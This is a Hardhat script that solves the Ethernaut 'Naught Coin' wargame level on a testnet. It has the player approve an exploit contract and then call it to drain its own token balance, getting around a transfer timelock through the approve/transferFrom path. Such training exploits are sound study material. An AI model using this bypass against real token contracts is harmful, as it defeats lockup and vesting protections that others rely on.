import { ethers } from "hardhat";

/**
 * Execute the NaughtCoin exploit to bypass the timelock
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-15-naught-coin/execute-naught-coin-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No NaughtCoinExploit contract address provided.");
    console.error("Please provide the address of your deployed NaughtCoinExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-15-naught-coin/execute-naught-coin-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using NaughtCoinExploit contract address: ${exploitAddress}`);
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  // Get the contract factory for NaughtCoin and connect to it
  const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
  let naughtCoin;
  
  if (!targetAddress) {
    // Try to get the target address from the exploit contract
    const NaughtCoinExploit = await ethers.getContractFactory("NaughtCoinExploit");
    const naughtCoinExploit = NaughtCoinExploit.attach(exploitAddress);
    targetAddress = await naughtCoinExploit.getFunction("naughtCoinAddress")();
  }
  
  naughtCoin = NaughtCoin.attach(targetAddress);
  console.log(`Connected to NaughtCoin contract at: ${targetAddress}`);
  
  // Get the player address and initial balance
  const player = await naughtCoin.getFunction("player")();
  const initialBalance = await naughtCoin.getFunction("balanceOf")(player);
  console.log(`Player address: ${player}`);
  console.log(`Initial balance: ${ethers.formatEther(initialBalance)} tokens`);
  
  // Connect to the exploit contract
  const NaughtCoinExploit = await ethers.getContractFactory("NaughtCoinExploit");
  const naughtCoinExploit = NaughtCoinExploit.attach(exploitAddress);
  
  // Step 1: Approve the exploit contract to spend tokens on behalf of the player
  console.log("Approving the exploit contract to spend tokens...");
  
  // Only proceed if the player is the signer (to prevent errors)
  if (player.toLowerCase() === signer.address.toLowerCase()) {
    const approveTx = await naughtCoin.getFunction("approve")(
      exploitAddress,
      initialBalance
    );
    await approveTx.wait();
    console.log(`Approval transaction successful: ${approveTx.hash}`);
    
    // Step 2: Execute the bypass to transfer all tokens
    console.log("Executing the exploit to bypass the timelock...");
    const bypassTx = await naughtCoinExploit.getFunction("bypassTimeLock")(signer.address);
    await bypassTx.wait();
    console.log(`Bypass transaction successful: ${bypassTx.hash}`);
    
    // Step 3: Check the final balance
    const finalBalance = await naughtCoin.getFunction("balanceOf")(player);
    console.log(`Final player balance: ${ethers.formatEther(finalBalance)} tokens`);
    
    const exploitSuccess = await naughtCoinExploit.getFunction("checkSuccess")();
    if (exploitSuccess) {
      console.log("✅ Success! All tokens have been transferred, bypassing the timelock.");
    } else {
      console.log("❌ The exploit did not fully transfer all tokens.");
    }
  } else {
    console.error("Error: The connected wallet is not the player. Cannot approve tokens.");
    console.error(`Connected wallet: ${signer.address}`);
    console.error(`Player address: ${player}`);
    console.error("Please make sure you're using the correct wallet or deploy the contract with the current wallet address.");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
